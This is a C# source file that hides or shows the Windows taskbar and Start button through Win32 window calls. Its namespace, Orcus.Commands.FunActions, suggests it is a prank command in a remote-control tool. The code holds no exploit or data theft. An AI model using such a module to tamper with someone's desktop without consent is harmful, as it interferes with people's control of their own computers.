using System;
using System.Diagnostics;
using System.Text;
using Orcus.Native;

namespace Orcus.Commands.FunActions
{
    internal static class Taskbar
    {
        private const string VistaStartMenuCaption = "Start";
        private static IntPtr vistaStartMenuWnd = IntPtr.Zero;
        // ReSharper restore InconsistentNaming

        /// <summary>
        ///     Sets the visibility of the taskbar.
        /// </summary>
        public static bool IsVisible
        {
            set { SetVisibility(value); }
        }

        /// <summary>
        ///     Show the taskbar.
        /// </summary>
        public static void Show()
        {
            SetVisibility(true);
        }

        /// <summary>
        ///     Hide the taskbar.
        /// </summary>
        public static void Hide()
        {
            SetVisibility(false);
        }

        /// <summary>
        ///     Hide or show the Windows taskbar and startmenu.
        /// </summary>
        /// <param name="show">true to show, false to hide</param>
        private static void SetVisibility(bool show)
        {
            // get taskbar window
            IntPtr taskBarWnd = NativeMethods.FindWindow("Shell_TrayWnd", null);

            // try it the WinXP way first...
            IntPtr startWnd = NativeMethods.FindWindowEx(taskBarWnd, IntPtr.Zero, "Button", "Start");

            if (startWnd == IntPtr.Zero)
            {
                // try an alternate way, as mentioned on CodeProject by Earl Waylon Flinn
                startWnd = NativeMethods.FindWindowEx(IntPtr.Zero, IntPtr.Zero, (IntPtr) 0xC017, "Start");
            }

            if (startWnd == IntPtr.Zero)
            {
                // ok, let's try the Vista easy way...
                startWnd = NativeMethods.FindWindow("Button", null);

                if (startWnd == IntPtr.Zero)
                {
                    // no chance, we need to to it the hard way...
                    startWnd = GetVistaStartMenuWnd(taskBarWnd);
                }
            }

            NativeMethods.ShowWindow(taskBarWnd, show ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
            NativeMethods.ShowWindow(startWnd, show ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
        }

        /// <summary>
        ///     Returns the window handle of the Vista start menu orb.
        /// </summary>
        /// <param name="taskBarWnd">windo handle of taskbar</param>
        /// <returns>window handle of start menu</returns>
        private static IntPtr GetVistaStartMenuWnd(IntPtr taskBarWnd)
        {
            // get process that owns the taskbar window
            uint procId;
            NativeMethods.GetWindowThreadProcessId(taskBarWnd, out procId);

            Process p = Process.GetProcessById((int) procId);

            // enumerate all threads of that process...
            foreach (ProcessThread t in p.Threads)
            {
                NativeMethods.EnumThreadWindows(t.Id, MyEnumThreadWindowsProc, IntPtr.Zero);
            }

            return vistaStartMenuWnd;
        }

        /// <summary>
        ///     Callback method that is called from 'EnumThreadWindows' in 'GetVistaStartMenuWnd'.
        /// </summary>
        /// <param name="hWnd">window handle</param>
        /// <param name="lParam">parameter</param>
        /// <returns>true to continue enumeration, false to stop it</returns>
        private static bool MyEnumThreadWindowsProc(IntPtr hWnd, IntPtr lParam)
        {
            StringBuilder buffer = new StringBuilder(256);
            if (NativeMethods.GetWindowText(hWnd, buffer, buffer.Capacity) > 0)
            {
                if (buffer.ToString() == VistaStartMenuCaption)
                {
                    vistaStartMenuWnd = hWnd;
                    return false;
                }
            }
            return true;
        }
    }
}